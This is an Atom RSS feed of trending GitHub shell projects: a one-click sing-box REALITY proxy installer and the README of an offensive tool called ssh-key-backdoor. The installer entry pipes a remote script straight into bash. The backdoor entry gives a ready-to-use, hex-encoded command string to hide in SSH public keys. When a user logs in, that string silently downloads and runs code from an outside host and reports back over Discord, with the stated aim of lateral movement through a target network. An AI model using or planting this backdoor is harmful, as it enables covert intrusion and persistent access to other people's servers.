<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Shell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-05-27T01:43:11Z</updated>
  <subtitle>Daily Trending of Shell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>deathline94/sing-REALITY-Box</title>
    <updated>2023-05-27T01:43:11Z</updated>
    <id>tag:github.com,2023-05-27:/deathline94/sing-REALITY-Box</id>
    <link href="https://github.com/deathline94/sing-REALITY-Box" rel="alternate"></link>
    <summary type="html">&lt;p&gt;One click REALITY installer on sing-box core&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;sing-REALITY-Box&lt;/h1&gt; &#xA;&lt;p&gt;One click REALITY installer on sing-box core&lt;/p&gt; &#xA;&lt;h1&gt;sing-REALITY-box&lt;/h1&gt; &#xA;&lt;p&gt;sing-REALITY-box is the first one-click installer script to install REALITY on sing-box core !&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Easy installation and configuration&lt;/li&gt; &#xA; &lt;li&gt;Ability to choose the desired port and SNI&lt;/li&gt; &#xA; &lt;li&gt;Real easy to use for the end-users&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Prerequisites&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Linux operating system&lt;/li&gt; &#xA; &lt;li&gt;Bash shell&lt;/li&gt; &#xA; &lt;li&gt;Internet connection&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;To use sing-REALITY-box, simply execute the following command on your Linux machine: Also updating the repo&#39;s is highly recommended (apt update &amp;amp;&amp;amp; apt upgrade)&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;This script uses JQ which will be automaticaly installed&lt;/li&gt; &#xA; &lt;li&gt;This script uses 443 as the default port number . change it if you want when the script asks you to.&lt;/li&gt; &#xA; &lt;li&gt;this script uses &#34;telewebion.com&#34; as the SNI . change it to your desired SNI when the script asks you to.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash &amp;lt;(curl -fsSL https://github.com/deathline94/sing-REALITY-Box/raw/main/sing-REALITY-box.sh)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Props&lt;/h2&gt; &#xA;&lt;p&gt;Huge props goes out to iSegaro for all he does . this script is the automation of his tutorial . keep up the work \m/ . find him on Twitter at @iSegaro&lt;/p&gt; &#xA;&lt;h2&gt;Contact me&lt;/h2&gt; &#xA;&lt;p&gt;You can find me on twitter at @NamelesGhoul for requests and questions&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>hackerschoice/ssh-key-backdoor</title>
    <updated>2023-05-27T01:43:11Z</updated>
    <id>tag:github.com,2023-05-27:/hackerschoice/ssh-key-backdoor</id>
    <link href="https://github.com/hackerschoice/ssh-key-backdoor" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;ssh-key-backdoor&lt;/h1&gt; &#xA;&lt;p&gt;This program generates a backdoor to hide inside an SSH &lt;em&gt;public&lt;/em&gt; key (e.g. &lt;code&gt;id_rsa.pub&lt;/code&gt; or &lt;code&gt;authorized_keys&lt;/code&gt;). The backdoor will execute &lt;em&gt;once&lt;/em&gt; when the user next logs in.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;The objective is to use the ssh &lt;em&gt;public&lt;/em&gt; key to move laterally within a target network. It exploits the fact that users copy their &lt;em&gt;public&lt;/em&gt; ssh key to other servers without checking the content. Any server where their public key is copied will automatically get &lt;strong&gt;backdoored&lt;/strong&gt;.&lt;/h3&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://blog.thc.org/infecting-ssh-public-keys-with-backdoors&#34;&gt;https://blog.thc.org/infecting-ssh-public-keys-with-backdoors&lt;/a&gt; for details&lt;/p&gt; &#xA;&lt;p&gt;Simply add the following &lt;strong&gt;backdoor-string&lt;/strong&gt; to the beginning of the public key (&lt;code&gt;id_rsa.pub&lt;/code&gt; or &lt;code&gt;authorized_keys&lt;/code&gt;; up until, but not including, the &lt;code&gt;ssh-ed255191 AAA...&lt;/code&gt;)&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;no-user-rc,no-X11-forwarding,command=&#34;`###---POWERSHELL---`;eval $(echo 5b5b20242873746174202d632559202f62696e2f73682920213d20242873746174202d632559202e73736829205d5d202626207b203a3b746f756368202d72202f62696e2f7368202e7373683b6578706f7274204b45593d22223b62617368202d63202224286375726c202d6673534c207468632e6f72672f737368782922207c7c2062617368202d632022242877676574202d2d6e6f2d766572626f7365202d4f2d207468632e6f72672f737368782922207c7c206578697420303b7d203e2f6465762f6e756c6c20323e2f6465762f6e756c6c2026203a3b5b5b202d6e20245353485f4f524947494e414c5f434f4d4d414e44205d5d202626206578656320245353485f4f524947494e414c5f434f4d4d414e443b5b5b202d7a20245348454c4c205d5d202626205348454c4c3d2f62696e2f626173683b5b5b202d66202f72756e2f6d6f74642e64796e616d6963205d5d20262620636174202f72756e2f6d6f74642e64796e616d69633b5b5b202d66202f6574632f6d6f7464205d5d20262620636174202f6574632f6d6f74643b65786563202d61202d2428626173656e616d6520245348454c4c2920245348454c4c3b0a|xxd -r -ps);&#34; ssh-ed25519 AAAAC3Nzblah.... &lt;/code&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;This DEMO backdoor-string installs &lt;a href=&#34;https://www.gsocket.io/deploy&#34;&gt;https://www.gsocket.io/deploy&lt;/a&gt; and reports the success back to our Discord channel.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Think of the ssh public key as a sort of &lt;code&gt;~/.bashrc&lt;/code&gt; but with your backdoor inside, that gets propagaded by the user to various servers, and when triggered sends a secret login code back to us.&lt;/p&gt; &#xA;&lt;p&gt;Create your own &lt;strong&gt;backdoor-string&lt;/strong&gt; by editing &lt;code&gt;ssh-key-backdoor.sh&lt;/code&gt; (between &lt;code&gt;---BEGIN BACKDOOR---&lt;/code&gt; and &lt;code&gt;---END BACKDOOR---&lt;/code&gt;) and execute:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;# Set your own discord key or the results will be reported to our Discord channel. Please.&#xA;$ export KEY=&#34;1246565073951234567/mEDRabcdefghijklnopqrstuvwxzyABCDEahagasdKr7YQmA0Ej1-Ibdaytta_XGGq-n&#34;&#xA;$ ./ssh-key-backdoor.sh&#xA;&#xA;# Or view the clear commands without hex-encoding&#xA;$ ./ssh-key-backdoor.sh clear&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;(The same &lt;code&gt;command=&lt;/code&gt;-trick can be used to trigger a canary or start other hidden services.)&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;This goes deep down the Bash rabbit hole...the curious reader may like to read our &lt;a href=&#34;https://blog.thc.org/infecting-ssh-public-keys-with-backdoors&#34;&gt;blog&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
</feed>